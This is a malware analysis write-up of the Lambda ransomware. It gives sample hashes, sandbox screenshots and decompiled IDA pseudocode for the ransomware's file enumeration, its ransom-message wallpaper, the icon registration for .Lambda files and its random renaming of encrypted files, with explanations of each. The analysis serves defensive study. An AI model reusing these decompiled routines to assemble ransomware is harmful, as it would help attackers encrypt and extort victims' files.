# Lambda Ransomware

Comprehensive analysis of the malware : https://app.any.run/tasks/6f97e090-e8d2-43cf-959c-658a1c166f53

https://www.virustotal.com/gui/file/ea761022497e50f68f276b659e340d95afa27c6b72776aaa497ec3e38118e48a/detection

## First Analyse with ANY.RUN

| Information | Data |
|--|--|
| File Type | PE32 executable (GUI) Intel 80386, for MS Windows |
| MD5|d6d92703ad1bd824cbc022a6402d7337|
|SHA-1|25a46b05630c4927f8ec0d95c4d7bbb2ca93ccfa|
|SHA-256|ea761022497e50f68f276b659e340d95afa27c6b72776aaa497ec3e38118e48a|
|Creation Time|2023-10-13 18:52:05 UTC|

### File information
![information](/images/lambda-01.png)

### Process graph
![information](/images/lambda-02.png)

### Process list
![information](/images/lambda-03.png)

### Malicious activities of Lambda
![information](/images/lambda-04.png)

### Droping some executable files after start
![information](/images/lambda-05.png)

### Modification of files by ecnrypted them
![information](/images/lambda-06.png)

### Some IP connection
![information](/images/lambda-07.png)

## Debugging part

We will study the malware using specific tools like Detect It Easy IDA Pro.

![information](/images/lambda-08.png)

### Search file process

```
ULONG __stdcall StartAddress(const WCHAR *Parameter)
{
  WCHAR *v1; // esi
  HANDLE CurrentThread; // eax
  int (__stdcall *v3)(LPCWSTR); // edi
  SIZE_T v4; // esi
  int *v5; // esi
  int *v6; // eax
  WCHAR *v7; // esi
  const WCHAR *v8; // esi
  int v9; // esi
  SIZE_T v10; // esi
  WCHAR *i; // edi
  int **v12; // eax
  LPWSTR ExtensionW; // eax
  const WCHAR *v14; // edi
  const WCHAR *v15; // esi
  int v16; // esi
  SIZE_T v17; // edi
  WCHAR *j; // esi
  _DWORD *v19; // eax
  int v20; // ecx
  HANDLE v22; // [esp-Ch] [ebp-284h]
  void *v23; // [esp-4h] [ebp-27Ch]
  const WCHAR *lpString; // [esp+10h] [ebp-268h]
  int *v25; // [esp+14h] [ebp-264h] BYREF
  int **v26; // [esp+18h] [ebp-260h]
  LPVOID lpMem; // [esp+1Ch] [ebp-25Ch]
  int v28; // [esp+20h] [ebp-258h]
  HANDLE hFindFile; // [esp+24h] [ebp-254h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+28h] [ebp-250h] BYREF

  v1 = (WCHAR *)Parameter;
  if ( (GetFileAttributesW(Parameter) & 0x10) == 0 )
    goto LABEL_43;
  CurrentThread = GetCurrentThread();
  SetThreadPriority(CurrentThread, 2);
  v28 = dword_4308D0;
  v26 = &v25;
  v25 = (int *)&v25;
  sub_408990((int)L"Start Enumeration: %s", (int)Parameter);
  v3 = lstrlenW;
  while ( 2 )
  {
    v4 = 2 * v3(v1) + 16;
    for ( lpMem = HeapAlloc(hHeap, 8u, v4); !lpMem; lpMem = HeapAlloc(hHeap, 8u, v4) )
      Sleep(0x64u);
    v5 = (int *)lpMem;
    lstrcpyW((LPWSTR)lpMem + 4, Parameter);
    v6 = v25;
    *v5 = (int)v25;
    v5[1] = (int)&v25;
    v6[1] = (int)v5;
    v25 = v5;
    if ( v5 == (int *)&v25 )
      goto LABEL_40;
    do
    {
      v7 = (WCHAR *)(v5 + 2);
      lpString = v7;
      sub_40A5E0(v7);
      lstrcatW(v7, L"*");
      hFindFile = FindFirstFileW(v7, &FindFileData);
      if ( hFindFile == (HANDLE)-1 )
        goto LABEL_39;
      *wcsrchr(v7, 0x2Au) = 0;
      do
      {
        if ( !lstrcmpiW(FindFileData.cFileName, L".")
          || !lstrcmpiW(FindFileData.cFileName, L"..")
          || (FindFileData.dwFileAttributes & 0x404) != 0 )
        {
          goto LABEL_37;
        }
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          if ( !dword_430938 || (FindFileData.dwFileAttributes & 2) == 0 )
          {
            v8 = ::lpMem;
            if ( *::lpMem )
            {
              while ( lstrcmpiW(FindFileData.cFileName, v8) )
              {
                v8 += v3(v8) + 1;
                if ( !*v8 )
                  goto LABEL_17;
              }
            }
            else
            {
LABEL_17:
              v9 = v3(lpString);
              v10 = 2 * (v9 + v3(FindFileData.cFileName)) + 18;
              for ( i = (WCHAR *)HeapAlloc(hHeap, 8u, v10); !i; i = (WCHAR *)HeapAlloc(hHeap, 8u, v10) )
                Sleep(0x64u);
              lstrcpyW(i + 4, lpString);
              lstrcatW(i + 4, FindFileData.cFileName);
              lstrcatW(i + 4, L"\\");
              v12 = v26;
              *(_DWORD *)i = &v25;
              *((_DWORD *)i + 1) = v12;
              *v12 = (int *)i;
              v26 = (int **)i;
            }
          }
        }
        else
        {
          if ( sub_40A560(FindFileData.cFileName) )
            goto LABEL_37;
          ExtensionW = PathFindExtensionW(FindFileData.cFileName);
          if ( !*ExtensionW )
            goto LABEL_27;
          v14 = ExtensionW + 1;
          if ( !lstrcmpiW(ExtensionW + 1, L"Lambda") )
            goto LABEL_37;
          v15 = dword_430914;
          if ( !*dword_430914 )
          {
LABEL_26:
            v7 = (WCHAR *)lpString;
            v3 = lstrlenW;
LABEL_27:
            if ( (FindFileData.nFileSizeLow || FindFileData.nFileSizeHigh)
              && (!v28 || FindFileData.nFileSizeHigh || FindFileData.nFileSizeLow > 0xA00000) )
            {
              v16 = v3(v7);
              v17 = 2 * (v16 + v3(FindFileData.cFileName)) + 2;
              for ( j = (WCHAR *)HeapAlloc(hHeap, 8u, v17); !j; j = (WCHAR *)HeapAlloc(hHeap, 8u, v17) )
                Sleep(0x64u);
              lstrcpyW(j, lpString);
              lstrcatW(j, FindFileData.cFileName);
              sub_40FB80(j);
              if ( !sub_40A8B0(j, FindFileData.cFileName) )
                _InterlockedIncrement(&dword_430A1C);
              HeapFree(hHeap, 0, j);
            }
            goto LABEL_37;
          }
          while ( lstrcmpiW(v14, v15) )
          {
            v15 += lstrlenW(v15) + 1;
            if ( !*v15 )
              goto LABEL_26;
          }
        }
LABEL_37:
        v3 = lstrlenW;
        v7 = (WCHAR *)lpString;
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
LABEL_39:
      v23 = lpMem;
      v22 = hHeap;
      v19 = (_DWORD *)*((_DWORD *)lpMem + 1);
      v20 = *(_DWORD *)lpMem;
      *v19 = *(_DWORD *)lpMem;
      *(_DWORD *)(v20 + 4) = v19;
      HeapFree(v22, 0, v23);
      v5 = v25;
      lpMem = v25;
    }
    while ( v25 != (int *)&v25 );
LABEL_40:
    v1 = (WCHAR *)Parameter;
    if ( v28 )
    {
      sub_408990((int)L"Finished Exploring Large Files on: %s", (int)Parameter);
      v28 = 0;
      continue;
    }
    break;
  }
  sub_408990((int)L"Finished Exploring All Files on: %s", (int)Parameter);
LABEL_43:
  HeapFree(hHeap, 0, v1);
  return 0;
}
```

1.  **Initialization and Directory Verification (Lines 1-6):**
    
    -   `v1 = (WCHAR *)Parameter;`: Stores the `Parameter` in `v1`.
    -   `if ( (GetFileAttributesW(Parameter) & 0x10) == 0 ) goto LABEL_43;`: Checks if `Parameter` is a directory. If not, the function terminates.
2.  **Setting Thread Priority (Lines 7-8):**
    
    -   `CurrentThread = GetCurrentThread(); SetThreadPriority(CurrentThread, 2);`: Retrieves the current thread and sets its priority to a specified level.
3.  **Preparation for File Enumeration (Lines 9-14):**
    
    -   Variables like `v28`, `v26`, and `v25` are initialized for managing files to be explored.
    -   A logging function `sub_408990` is called, indicating the start of enumeration.
4.  **Main Enumeration Loop (Line 15 and onwards):**
    
    -   The `while (2)` loop suggests an infinite loop, but it has exit points.
    -   Memory allocation (`HeapAlloc`) and checking (`Sleep(0x64u)`) are performed to handle insufficient memory situations.
5.  **Processing Each File (Block inside the loop):**
    
    -   `hFindFile = FindFirstFileW(v7, &FindFileData);`: Starts the search for the first file in the directory.
    -   The condition `if ( hFindFile == (HANDLE)-1 )` checks if the search failed.
6.  **Processing Found Files (Nested `do {...} while (...)` loop):**
    
    -   The loop processes each file found by `FindNextFileW`.
    -   Filters out special files like `.` and `..`, and hidden or system files/folders.
    -   Handles subdirectories recursively.
    -   Processes files based on specific criteria like extension and file size.
7.  **Cleanup and Resource Release (End of the function):**
    
    -   Memory allocated (`HeapFree`) for each enumerated item is released.
    -   If the variable `v28` is set, a log is written indicating the end of the exploration of large files.
    -   The function concludes by freeing the memory of `v1` and returning `0`.

### Change Wallpaper

```
void sub_4096B0()
{
  HDC DC; // eax
  HDC v1; // edi
  HDC CompatibleDC; // ebx
  int DeviceCaps; // eax
  int v4; // esi
  HFONT FontW; // eax
  HBITMAP CompatibleBitmap; // eax
  DWORD v7; // esi
  void *v8; // edi
  LPVOID v9; // eax
  HANDLE FileW; // eax
  int v11; // eax
  int v12; // eax
  WCHAR String[2048]; // [esp+10h] [ebp-1280h] BYREF
  WCHAR pszPath[262]; // [esp+1010h] [ebp-280h] BYREF
  struct tagSIZE psizl; // [esp+121Ch] [ebp-74h] BYREF
  struct tagRECT rc; // [esp+1224h] [ebp-6Ch] BYREF
  char bmi[46]; // [esp+1234h] [ebp-5Ch] BYREF
  int v18; // [esp+1262h] [ebp-2Eh]
  int v19; // [esp+1266h] [ebp-2Ah]
  HGDIOBJ ho; // [esp+126Ch] [ebp-24h]
  HDC v21; // [esp+1270h] [ebp-20h]
  DWORD nNumberOfBytesToWrite; // [esp+1274h] [ebp-1Ch]
  HDC v23; // [esp+1278h] [ebp-18h]
  HBITMAP hbm; // [esp+127Ch] [ebp-14h]
  DWORD NumberOfBytesWritten; // [esp+1280h] [ebp-10h] BYREF
  int cchText; // [esp+1284h] [ebp-Ch]
  int cy; // [esp+1288h] [ebp-8h]
  HKEY phkResult; // [esp+128Ch] [ebp-4h] BYREF

  if ( !Parameter )
  {
    if ( dword_430940 )
    {
      DC = GetDC(0);
      v1 = DC;
      v21 = DC;
      if ( DC )
      {
        CompatibleDC = CreateCompatibleDC(DC);
        v23 = CompatibleDC;
        if ( CompatibleDC )
        {
          phkResult = (HKEY)((GetDeviceCaps(v1, 8) + 1) & 0xFFFFFFFE);
          cy = (GetDeviceCaps(v1, 10) + 1) & 0xFFFFFFFE;
          DeviceCaps = GetDeviceCaps(v1, 88);
          v4 = cy;
          FontW = CreateFontW(6 * (cy / DeviceCaps), 0, 0, 0, 512, 0, 0, 0, 1u, 9u, 0, 3u, 0, L"Arial");
          ho = FontW;
          if ( FontW )
          {
            if ( SelectObject(CompatibleDC, FontW) )
            {
              cchText = wsprintfW(
                          String,
                          L"All of your files are stolen and encrypted!\r\n"
                           "Find LAMBDA_README.txt and follow instructions");
              if ( GetTextExtentPoint32W(CompatibleDC, String, cchText, &psizl) )
              {
                CompatibleBitmap = CreateCompatibleBitmap(CompatibleDC, (int)phkResult, v4);
                hbm = CompatibleBitmap;
                if ( CompatibleBitmap )
                {
                  if ( SelectObject(CompatibleDC, CompatibleBitmap) )
                  {
                    SetTextColor(CompatibleDC, 0xFFFFFFu);
                    SetBkMode(CompatibleDC, 2);
                    SetBkColor(CompatibleDC, 0);
                    rc.left = 0;
                    rc.top = (v4 >> 1) - psizl.cy;
                    rc.right = (LONG)phkResult;
                    rc.bottom = v4;
                    if ( DrawTextW(CompatibleDC, String, cchText, &rc, 0x211u) )
                    {
                      *(_WORD *)&bmi[40] = 19778;
                      NumberOfBytesWritten = 0;
                      v19 = 54;
                      *(_DWORD *)bmi = 40;
                      v7 = 2 * (_DWORD)phkResult * v4;
                      *(_DWORD *)&bmi[4] = phkResult;
                      nNumberOfBytesToWrite = v7;
                      *(_DWORD *)&bmi[42] = v7 + 54;
                      v18 = 0;
                      *(_DWORD *)&bmi[8] = cy;
                      *(_DWORD *)&bmi[12] = 1048577;
                      memset(&bmi[16], 0, 24);
                      v8 = HeapAlloc(hHeap, 8u, v7);
                      cchText = (int)v8;
                      if ( !v8 )
                      {
                        do
                        {
                          Sleep(0x64u);
                          v9 = HeapAlloc(hHeap, 8u, v7);
                          cchText = (int)v9;
                        }
                        while ( !v9 );
                        CompatibleDC = v23;
                        v8 = v9;
                      }
                      if ( GetDIBits(CompatibleDC, hbm, 0, cy, v8, (LPBITMAPINFO)bmi, 0) )
                      {
                        SHGetFolderPathW(0, 35, 0, 0, pszPath);
                        lstrcatW(pszPath, L"\\LLTKTPR.bmp");
                        FileW = CreateFileW(pszPath, 0x40000000u, 0, 0, 1u, 0x80u, 0);
                        cy = (int)FileW;
                        if ( FileW != (HANDLE)-1 )
                        {
                          WriteFile(FileW, &bmi[40], 0xEu, &NumberOfBytesWritten, 0);
                          WriteFile((HANDLE)cy, bmi, 0x28u, &NumberOfBytesWritten, 0);
                          WriteFile((HANDLE)cy, v8, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
                          CloseHandle((HANDLE)cy);
                          if ( !RegOpenKeyExW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, 0x20106u, &phkResult) )
                          {
                            v11 = lstrlenW(L"2");
                            RegSetValueExW(phkResult, L"WallpaperStyle", 0, 1u, (const BYTE *)L"2", 2 * v11 + 2);
                            v12 = lstrlenW(L"0");
                            RegSetValueExW(phkResult, L"TileWallpaper", 0, 1u, (const BYTE *)L"0", 2 * v12 + 2);
                            RegCloseKey(phkResult);
                            v8 = (void *)cchText;
                          }
                          SystemParametersInfoW(0x14u, 0, pszPath, 3u);
                        }
                      }
                      HeapFree(hHeap, 0, v8);
                      v1 = v21;
                    }
                  }
                  DeleteObject(hbm);
                }
              }
            }
            DeleteObject(ho);
          }
          DeleteDC(CompatibleDC);
        }
        ReleaseDC(0, v1);
      }
    }
  }
}
```
1.  **Acquisition and Preparation of Drawing Context (Device Context):**
    
    -   Obtains the drawing context (DC) for the screen (`GetDC`) and creates a compatible drawing context (`CreateCompatibleDC`).
    -   Determines the screen dimensions and creates a font (`CreateFontW`) and a compatible bitmap (`CreateCompatibleBitmap`).
2.  **Preparing the Text:**
    
    -   Formats a string, likely a ransom message, indicating that the user's files have been encrypted.
    -   Calculates the text size and prepares a rectangle (`rc`) for drawing the text.
3.  **Drawing the Text:**
    
    -   Sets up text properties (color, background) and draws the formatted text onto the compatible bitmap using `DrawTextW`.
4.  **Creating a Bitmap Image:**
    
    -   Prepares a bitmap file header and copies the image of the drawn text into a buffer using `GetDIBits`.
5.  **Saving the Image and Changing the Wallpaper:**
    
    -   Retrieves the path to the "My Documents" folder and creates a bitmap file (`CreateFileW`).
    -   Writes the bitmap image to the file and closes the file (`WriteFile`, `CloseHandle`).
    -   Modifies the registry key to change the user's wallpaper, likely to display the ransom message.
    -   Uses `SystemParametersInfoW` to refresh the wallpaper.
6.  **Cleanup and Resource Release:**
    
    -   Releases graphical resources (font, bitmap, drawing context) and frees allocated memory.

This function generates a ransom message as an image, saves it on the user's system, and modifies the wallpaper to display this message. 

![wallpaper](/images/lambda-wallpaper.jpeg)

### Change icon for .Lambda file

```
void sub_409A50()
{
  HRSRC ResourceW; // esi
  DWORD v1; // edi
  HGLOBAL Resource; // eax
  const void *v3; // ebx
  HANDLE FileW; // esi
  int v5; // eax
  WCHAR pszPath[260]; // [esp+0h] [ebp-210h] BYREF
  DWORD NumberOfBytesWritten; // [esp+208h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+20Ch] [ebp-4h] BYREF

  if ( !Parameter && dword_4309CC )
  {
    SHGetFolderPathW(0, 35, 0, 0, pszPath);
    lstrcatW(pszPath, L"\\BTC.ico");
    ResourceW = FindResourceW(0, (LPCWSTR)0x66, (LPCWSTR)0xA);
    v1 = SizeofResource(0, ResourceW);
    Resource = LoadResource(0, ResourceW);
    v3 = LockResource(Resource);
    NumberOfBytesWritten = 0;
    FileW = CreateFileW(pszPath, 0x40000000u, 0, 0, 1u, 0x80u, 0);
    if ( FileW != (HANDLE)-1 )
    {
      WriteFile(FileW, v3, v1, &NumberOfBytesWritten, 0);
      CloseHandle(FileW);
    }
    if ( !RegCreateKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Classes\\.Lambda\\DefaultIcon",
            0,
            0,
            0,
            0x2011Fu,
            0,
            &phkResult,
            0) )
    {
      v5 = lstrlenW(pszPath);
      RegSetValueExW(phkResult, 0, 0, 1u, (const BYTE *)pszPath, 2 * v5 + 2);
      RegCloseKey(phkResult);
    }
    SHChangeNotify(0x8000000, 0, 0, 0);
  }
}
```

1.  **Path and Resource Preparation:**
    
    -   The function uses `SHGetFolderPathW` to retrieve the path to a special folder (probably the user's personal folder) and appends `"\\BTC.ico"` to it. This suggests it's creating a path for an ICO file (icon file format).
    -   It then finds (`FindResourceW`) and loads (`LoadResource`) a resource, identified by `0x66` and `0xA` from the executable itself or an associated resource file.
2.  **File Creation and Writing:**
    
    -   After loading the resource, it locks the resource in memory (`LockResource`) and creates a file at the previously constructed path (`CreateFileW`) with write access.
    -   Writes the resource's content to the file (`WriteFile`). This action suggests it's extracting and saving an icon file to the filesystem.
3.  **Registry Modification:**
    
    -   Creates a new registry key (`RegCreateKeyExW`) at `HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.Lambda\DefaultIcon`. This could be an attempt to associate a particular file extension (in this case, `.Lambda`) with a specific icon (the one saved earlier).
    -   Sets the default value of this registry key (`RegSetValueExW`) to the path of the saved icon file.
4.  **Notification of Change:**
    
    -   Calls `SHChangeNotify` to notify the system and other applications of a change in the shell (like file associations), which updates the system's view and potentially changes the icon associated with `.Lambda` files.
5.  **Condition Check:**
    
    -   The entire functionality is wrapped in a condition that checks the `Parameter` variable and `dword_4309CC`. If `Parameter` is not set and `dword_4309CC` is true, the code executes. Otherwise, it doesn't.

In summary, `sub_409A50` that extracts an icon resource from itself, saves it to the filesystem, and then modifies the system registry to associate a certain file extension with this new icon.

![add_icon](/images/lambda-09.png)

### Lambda README file

![readme](/images/lambda-readme-01.png)

We can see it on ANY.RUN analyse

![readme](/images/lambda-readme-02.png)

![readme](/images/lambda-readme-03.png)

### New filename of encrypted file

```cpp
      while ( 1 )
      {
        if ( dword_4308F0 )
        {
          v12 = Seed;
          if ( !Seed && byte_43083F != (_BYTE)Seed )
          {
            __asm { rdseed  ecx }
            if ( (unsigned __int8)byte_43083F >= (unsigned __int8)Seed )
              v12 = 563;
            Seed = v12;
          }
          qmemcpy(String, L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", 0x7Eu);
          for ( i = 0; i < 9; ++i )
          {
            v15 = lstrlenW((LPCWSTR)String) - 1;
            String2[i] = String[RtlRandomEx(&Seed) % v15];
          }
          v9 = lpString1;
          String2[9] = 0;
          lstrcpyW(lpString1, v2);
          PathRemoveFileSpecW(v9);
          v11 = (void (__stdcall *)(LPWSTR, LPCWSTR))lstrcatW;
          lstrcatW(v9, L"\\");
          lstrcatW(v9, String2);
          lstrcatW(v9, L".Lambda");
        }
        else
        {
          lstrcpyW(v9, v2);
          v17 = (char *)FileHandle + 1;
          v18 = FileHandle == 0;
          FileHandle = (char *)FileHandle + 1;
          if ( v18 )
            wsprintfW(String2, L".Lambda");
          else
            wsprintfW(String2, L"%lu.Lambda", v17);
          v11(v9, String2);
        }
        v19 = MoveFileExW(v2, v9, 8u);
```

This code appears to be part of an infinite loop (`while (1)`) and performs file name generation and file manipulation operations. Here's a simplified breakdown of its key steps:

1.  **Condition Checking:** The code first checks if a global or static variable (`dword_4308F0`) is set. This variable seems to control the behavior of the following code.
    
2.  **Random String Generation:**
    
    -   If `dword_4308F0` is true, the code generates a random string. It starts by checking and possibly updating a `Seed` value (used for random generation).
    -   The code copies a set of characters (lowercase and uppercase alphabets followed by numbers) into a `String` variable.
    -   A loop (`for`) generates a random 9-character string `String2` using the `RtlRandomEx` function with the random seed.
3.  **File Path Construction:**
    
    -   The code constructs a file path using the generated random string (`String2`), appending the ".Lambda" extension at the end.
    -   If `dword_4308F0` is false, another method is used for generating a file name based on the value of `FileHandle`.
4.  **File Manipulation:**
    
    -   The code attempts to move or rename a file (`MoveFileExW`) using the paths constructed earlier. The `8u` parameter indicates it should replace the file if it already exists.

In summary, this code seems involved in generating random file names and moving or modifying files on the system.

![information](/images/lambda-10.png)
